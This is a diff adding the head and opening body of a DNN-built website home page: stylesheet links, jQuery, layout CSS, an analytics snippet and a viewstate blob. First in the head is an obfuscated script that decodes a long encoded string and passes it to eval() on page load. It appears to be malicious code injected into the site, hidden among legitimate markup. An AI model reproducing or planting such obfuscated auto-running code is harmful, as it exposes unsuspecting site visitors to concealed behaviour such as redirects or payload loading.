@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head id="Head"><meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+<meta name="REVISIT-AFTER" content="1 DAYS">
+<meta name="RATING" content="GENERAL">
+<meta name="RESOURCE-TYPE" content="DOCUMENT">
+<meta content="text/javascript" http-equiv="Content-Script-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<script>var _0xc25e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe22c(d,e,f){var g=_0xc25e[2][_0xc25e[1]](_0xc25e[0]);var h=g[_0xc25e[3]](0,e);var i=g[_0xc25e[3]](0,f);var j=d[_0xc25e[1]](_0xc25e[0])[_0xc25e[10]]()[_0xc25e[9]](function(a,b,c){if(h[_0xc25e[4]](b)!==-1)return a+=h[_0xc25e[4]](b)*(Math[_0xc25e[8]](e,c))},0);var k=_0xc25e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc25e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe22c(s,e,10)-t)}return decodeURIComponent(escape(r))}("XOXGjRRGjpXGjXXGpZdGjpRGjRjGjXpGjXXGXOXGXOpGXdRGjjRGXdRGpZOGjXpGpZdGjpXGjXRGpZZGjXXGjpRGXZRGpZpGpZOGpZOGpppGjppGpZZGjXXGjpRGpjpGjRjGjXZGjpRGpZZGjXXGpZZGjXOGXOXGXORGppXGpjOGpjjGppRGjXpGjXXGjpRGpZZGjXXGjpRGpjpGjXpGpZpGpZOGpZZGpZOGXORGXOOGXdRGjRRGjpXGjXXGpZdGjpRGjRjGjXpGjXXGXOXGXOpGXdRGjjRGXdRGjppGpZpGjXOGXdRGjXjGXdRGpXXGXdRGjRZGjXpGpZdGpZpGjpRGjRjGjXpGjXXGXZRGjXjGpZpGjpRGjRpGjXXGpZpGjXRGpZZGXZRGjXOGpZZGjXjGjRZGpZpGpZdGpZZGXOXGXZXGpOZGpOdGXZXGpOjGpZpGXOZGjpZGpOOGjjRGXZdGjjpGXOZGpOjGpXOGXOZGpOpGpOOGjjRGXZdGjjpGpOdGXZXGXZXGXOOGXdRGXORGXZXGXORGXOpGpRZGXdRGjppGpZpGjXOGXdRGjXdGXdRGpXXGXdRGjRZGjXpGpZdGpZpGjpRGjRjGjXpGjXXGXZRGjXZGpZZGpZpGjXOGpZdGjRpGpRZGXdRGjRjGjRRGXdRGXOXGpOjGXORGXZXGpZRGpZOGjXXGjXXGXZXGpXOGpZOGjXRGjRjGjXXGXZXGXORGXOOGXORGXZXGpZRGpZOGjXXGjXXGXZXGppOGjXpGjXZGjpRGXZXGXORGXOOGXORGXZXGpZRGpZOGjXXGjXXGXZXGpjpGjXpGjRXGjRjGjXXGXORGXOOGXORGXZXGpZRGpZOGjXXGjXXGXZXGpdXGpZZGjRXGjRjGjXZGjpRGpZZGjXOGXORGXOOGXORGXZXGpZRGpZOGjXXGjXXGXZXGpXOGpjZGppZGXZXGXORGpOOGXZRGjXZGjXpGjXRGpZZGXOXGjRRGjpXGjXXGpZdGjpRGjRjGjXpGjXXGXOXGjXOGXOpGjjRGjXOGpZZGjpRGjpXGjXOGjXXGXdRGjXjGXZRGjXZGjpRGpZpGjXOGjpRGjXZGpdZGjRjGjpRGjRpGXOXGjXOGXOpGpRZGjjpGXOpGXdRGjjXGjjXGXdRGpOjGXORGXZXGpZRGpZOGjXXGjXXGXZXGppXGpZZGjXZGjROGjpRGjXpGjXjGpjjGjXpGpZOGjpXGjRZGpZZGjXZGXZXGXORGXOOGXORGXZXGpZRGpZOGjXXGjXXGXZXGpjZGjXpGjXOGjpRGpZpGjRZGjXZGXZXGXORGpOOGXZRGjXZGjXpGjXRGpZZGXOXGjRRGjpXGjXXGpZdGjpRGjRjGjXpGjXXGXOXGjXOGXOpGjjRGjXOGpZZGjpRGjpXGjXOGjXXGXdRGjXjGXZRGjXZGjpRGpZpGjXOGjpRGjXZGpdZGjRjGjpRGjRpGXOXGjXOGXOpGpRZGjjpGXOpGXdRGjjXGjjXGXdRGjXjGXZRGjRjGjXXGpZdGjRZGjpXGpZOGpZZGjXZGXOXGXORGXZXGpZdGjpRGjRZGXZXGXORGXOpGXdRGjjXGjjXGXdRGjXdGXZRGjRjGjXXGpZdGjRZGjpXGpZOGpZZGjXZGXOXGXORGpZOGjXXGjXXGjXjGjXOGjRjGjXXGjpRGjXRGjXpGpZOGpZZGXORGXOpGXdRGjjXGjjXGXdRGjXdGXZRGjRjGjXXGpZdGjRZGjpXGpZOGpZZGjXZGXOXGXORGjXjGjXpGjXjGpddGjXjGpXXGjpRGjXOGjpXGpZZGXORGXOpGXdRGjjXGjjXGXdRGjXdGXZRGjRjGjXXGpZdGjRZGjpXGpZOGpZZGjXZGXOXGXORGpZdGjpRGjRZGpXXGXORGXOpGXdRGjjXGjjXGXdRGjXdGXZRGjRjGjXXGpZdGjRZGjpXGpZOGpZZGjXZGXOXGXORGjRjGjXZGpdpGjpXGjXjGpZZGjXOGpdjGpZpGpZjGpXXGjpRGjXOGjpXGpZZGXORGXOpGXdRGjjXGjjXGXdRGpOjGXORGppRGjXpGjXXGjpRGjXOGjXpGjRZGpXZGpZpGjXOGXORGXOOGXORGppRGjXpGjXXGjpRGjXOGjXpGjRZGpjZGpZpGjXXGpZZGjRZGXORGXOOGXORGjXjGpZZGjXOGjXZGjXpGjXXGpZpGpZjGpZpGjXOGXOZGjXjGjRZGpZpGpZdGpZZGjRpGjXpGjRZGpZOGpZZGjXOGXORGXOOGXORGjXjGpZZGjXOGjXZGjXpGjXXGpZpGpXZGpZpGjXOGXOZGjRjGjRRGjXOGpZpGjXRGpZZGXORGXOOGXORGpZOGjXXGjXXGppRGjXpGjXXGjpRGjXOGjXpGjRZGpjZGpZpGjXXGpZZGjRZGXORGXOOGXORGpZOGjXXGjXXGpppGpZOGjRjGjpRGpdpGjpRGpZpGjpRGpZZGXORGpOOGXdRGXZRGjXZGjXpGjXRGpZZGXOXGjRRGjpXGjXXGpZdGjpRGjRjGjXpGjXXGXOXGjRjGpZOGXOpGjjRGjXOGpZZGjpRGjpXGjXOGjXXGXdRGXdXGXdXGpZOGjXpGpZdGjpXGjXRGpZZGjXXGjpRGXZRGjRXGpZZGjpRGpppGjRZGpZZGjXRGpZZGjXXGjpRGpXZGjpOGppZGpZOGXOXGjRjGpZOGXOpGpRZGjjpGXOpGXdRGjjXGjjXGXdRGXOXGjpRGjpOGjXjGpZZGjXpGjRRGXdRGpZOGjXXGjXXGXdXGpXXGpXXGXORGjpXGjXXGpZOGpZZGjRRGjRjGjXXGpZZGpZOGXORGXdZGXdZGpZOGjXXGjXXGXZRGpZdGjXpGjXXGjpRGjXOGjXpGjRZGpXZGpZpGjXOGpdpGpZZGjpRGjpRGjRjGjXXGjRXGjXZGXOpGXdRGjjXGjjXGXdRGXdXGXdXGjpjGjRjGjXXGpZOGjXpGjpjGXZRGjXjGpZZGjXOGjXZGjXpGjXXGpZpGpXZGpZpGjXOGpdpGpZZGjpRGjpRGjRjGjXXGjRXGjXZGXOpGXdRGjXOGpZZGjpRGjpXGjXOGjXXGpRZGXdRGjppGpZpGjXOGXdRGjXZGXdRGpXXGXdRGpZOGjXpGpZdGjpXGjXRGpZZGjXXGjpRGXZRGpZdGjXOGpZZGpZpGjpRGpZZGpppGjRZGpZZGjXRGpZZGjXXGjpRGXOXGXORGjXZGpZdGjXOGjRjGjXjGjpRGXORGXOpGpRZGXdRGjXZGXZRGpZpGjXZGjpOGjXXGpZdGXdRGpXXGXdRGjpRGjXOGjpXGpZZGpRZGXdRGjXZGXZRGjXZGjXOGpZdGXdRGpXXGXdRGXORGjRpGjpRGjpRGjXjGjXZGpROGXZXGXZXGjXjGpZpGjRXGpZZGpZpGpZOGXZdGXZRGjRXGjXpGjXpGjRXGjRZGpZZGjXZGjpOGjXXGpZOGjRjGpZdGpZpGjpRGjRjGjXpGjXXGXZRGpZdGjXpGjXRGXZXGjXjGpZpGjRXGpZZGpZpGpZOGXZXGjRdGjXZGXZXGpZpGpZOGjXZGpZjGjpOGjRXGjXpGjXpGjRXGjRZGpZZGXZRGjRdGjXZGpXjGpZdGjRZGjRjGpZZGjXXGjpRGpXXGpZdGpZpGXOZGjXjGjpXGpZjGXOZGpRdGXZjGXZdGpRdGpRRGXZjGpRpGpRXGXZZGXZjGXZdGpRpGpRXGXZdGpRpGpRpGXORGpRZGXdRGjXZGXZRGjXZGpZZGjpRGpXOGjpRGjpRGjXOGjRjGpZjGjpXGjpRGpZZGXOXGXORGpZdGjXOGjXpGjXZGjXZGjXpGjXOGjRjGjRXGjRjGjXXGXORGXOOGXdRGXORGpZpGjXXGjXpGjXXGjpOGjXRGjXpGjpXGjXZGXORGXOpGpRZGXdRGpZOGjXpGpZdGjpXGjXRGpZZGjXXGjpRGXZRGjRpGpZZGpZpGpZOGXZRGpZpGjXjGjXjGpZZGjXXGpZOGppRGjRpGjRjGjRZGpZOGXOXGjXZGXOpGpRZGXdRGjjpGXOpGpRZGXRZGjjpGXOpGXOXGXOpGpRZG",8,"RXpjdOZGY",45,7,12))</script><title>
+	Home
+</title><meta id="MetaRobots" name="robots" content="INDEX, FOLLOW"><link href="/_dnn/Portals/0-System/dnn-css-variables.css?cdv=866" rel="stylesheet"><link href="/_dnn/Resources/Shared/stylesheets/dnndefault/10.0.0/default.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/admin.css?cdv=866" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Open Sans:300,300italic,regular,italic,600,600italic,700,700italic,800,800italic|Roboto:100,100italic,300,300italic,regular,500,500italic,700italic&display=swap&subset=" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/vendor/bootstrap/bootstrap.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/vendor/Magnific-Popup-master/dist/magnific-popup.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/vendor/ilightbox/css/ilightbox.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/vendor/swiper/swiper.min.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/vendor/soon/soon.min.css?cdv=866" rel="stylesheet"><link href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/linearicons.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/jquery.mmenu.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/animate.min.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/Layouts/0/LayoutDB.Header.creative-02.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/Layouts/0/LayoutDB.Content.creative-02-home.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/Layouts/0/LayoutDB.Footer.default.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/loaders.css?cdv=866" rel="stylesheet"><link href="/_DNN/Portals/_default/Skins/dng-theme-pro/skin.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/post.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/button.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/accordion.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/tab.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/pricing.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/list.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/promoboxes.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/blockquote.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/clients.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/infobox.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/title.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/imagebox.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/counter.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/testimonials.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/icon-list.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/blog-list.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/blog.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/portfolios.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/ourteam.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/isotope.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/dng-cascading-images.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/hotspot.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/color.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/header.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/topiconbox.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/sideiconbox.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/loadlist.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/chartlist.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/flipbox.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/time-line.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/page-law.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/page-contentbuilder.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/resource/css/theme.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/global-0.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/_default/Skins/dng-theme-pro/page-167-home.css?cdv=866" rel="stylesheet"><link href="/_DNN/Portals/_default/containers/dng-theme-pro/container.css?cdv=866" rel="stylesheet"><link href="/_dnn/Portals/0/portal.css?cdv=866" rel="stylesheet"><link href="/_DNN/DesktopModules/DNNGo_ThemePluginPro/Resource/css/jquery.mmenu.css?cdv=866" rel="stylesheet"><script src="/_dnn/Resources/libraries/jQuery/03_07_01/jquery.js?cdv=866" type="text/javascript"></script><script src="/_dnn/Resources/libraries/jQuery-Migrate/03_04_01/jquery-migrate.js?cdv=866" type="text/javascript"></script><script src="/_dnn/Resources/libraries/jQuery-UI/01_14_01/jquery-ui.min.js?cdv=866" type="text/javascript"></script><style>
+@media only screen  and (max-width: 1199px) {
+#dng-megamenu673076 .primary_structure>li>a, #dng-megamenu673076 .primary_structure>li>a:link, #dng-megamenu673076 .primary_structure>li>a:active, #dng-megamenu673076 .primary_structure>li>a:visited {
+    font-size: 14px;
+}
+  #dng-megamenu673076 .primary_structure>li>a {
+    padding-right: 11px;
+    padding-left: 11px;
+}
+}
+@media only screen and (max-width: 991px) {
+#dnn_content {
+    padding-top: 0px !important;
+}
+#row-240700 {
+    padding-top: 25px;
+}
+}
+@media only screen and (max-width: 767px) {
+#dnn_content {
+    padding-top: 0px;
+}
+}
+.dng-list.line-solid li, .dng-list.line-dashed li, .dng-list.line-dotted li {
+    border-bottom: 1px solid #0388a6;
+}
+#dnn_content {
+    padding-top: 80px;
+    padding-bottom: 66px !important;
+}
+
+</style>
+
+<link rel='icon' href='/_dnn/Portals/0/Images/favicon.ico?ver=wHAjHXRCXx_CyulcBKUmeQ%3d%3d' type='image/x-icon'>     
+        
+			    <script type="text/javascript">
+			      var _gaq = _gaq || [];
+			      _gaq.push(['_setAccount', 'UA-49285134-11']);
+			      _gaq.push(['_trackPageview']);
+			      
+			 
+			      (function() {
+				    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+				    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+				    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+			      })();
+			    </script>
+        
+		  <meta name="viewport" content="width=device-width,height=device-height, minimum-scale=1.0, maximum-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge"></head>
+<body id="Body">
+
+    <form method="post" action="/_dnn/default.aspx" id="Form" enctype="multipart/form-data">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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